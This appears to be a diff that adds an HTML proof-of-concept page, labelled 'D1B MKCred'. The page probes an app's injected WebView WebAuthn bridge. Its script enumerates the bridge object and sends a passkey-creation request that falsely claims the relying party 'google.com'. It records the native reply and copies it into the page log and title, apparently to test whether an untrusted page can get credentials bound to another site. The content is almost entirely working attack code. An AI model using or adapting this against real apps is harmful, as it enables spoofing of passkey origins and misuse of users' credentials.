@@ -1,0 +1,54 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>MM D1B MKCred</title></head>
+<body style="background:#030;color:#fff;font-family:sans-serif;font-size:15px">
+<h1 id="st">D1B MKCred google.com</h1>
+<pre id="log">BOOT</pre>
+<script>
+function q(k){ var s=location.search + "&" + location.hash.slice(1);
+  var m=s.match(new RegExp("[&#?]*"+k+"=([^&]*)")); return m ? decodeURIComponent(m[1]) : null; }
+var CH = q("challenge") || "AAECAwQFBgcICQoLDA0ODxAREhM=";
+var RP = q("rp") || "google.com";
+var MODE = q("m") || "flat";     // flat: {publicKey:{rpId:...}}  std: {publicKey:{rp:{id:...}}}
+window.__reply = "";
+function ev(m){ try{ document.getElementById('log').textContent += "\n" + m;
+  document.title = ("EV:" + m).slice(0,300); }catch(e){} }
+ev("loaded " + location.href);
+ev("MODE=" + MODE + " rpId=" + RP);
+if (!window.__webauthn_interface__) { ev("IFACE_ABSENT"); }
+else {
+  var keys = "?";
+  try { keys = Object.getOwnPropertyNames(window.__webauthn_interface__).join(","); } catch(e){ keys="ERR:"+e; }
+  ev("IFACE_PRESENT keys=" + keys);
+  window.__webauthn_interface__.onmessage = function(m){
+    var s = (typeof m === 'string') ? m : JSON.stringify(m);
+    window.__reply = s;
+    ev("REPLY len=" + s.length);
+    ev("REPLY:" + s.slice(0, 8000));
+  };
+  var msg;
+  if (MODE === "std") {
+    msg = JSON.stringify({ publicKey: {
+      challenge: CH, rp: { id: RP }, user: { id: "b3duLWxhd24i", name: "own",
+        displayName: "own" },
+      pubKeyCredParams: [{type:"public-key",alg:-7}],
+      authenticatorSelection: { authenticatorAttachment: "platform",
+        residentKey: "preferred", userVerification: "required" },
+      timeout: 120000
+    } });
+  } else {
+    msg = JSON.stringify({ publicKey: {
+      challenge: CH, rpId: RP, user: { id: "b3duLWxhd24i", name: "own",
+        displayName: "own" },
+      pubKeyCredParams: [{type:"public-key",alg:-7}],
+      authenticatorSelection: { authenticatorAttachment: "platform",
+        residentKey: "preferred", userVerification: "required" },
+      timeout: 120000
+    } });
+  }
+  setTimeout(function(){
+    try { window.__webauthn_interface__.postMessage(msg);
+      ev("POSTED_OK mode=" + MODE + " ch=" + CH.slice(0,40)); }
+    catch(e){ ev("POST_ERR:" + e); }
+  }, 1500);
+}
+</script></body></html>
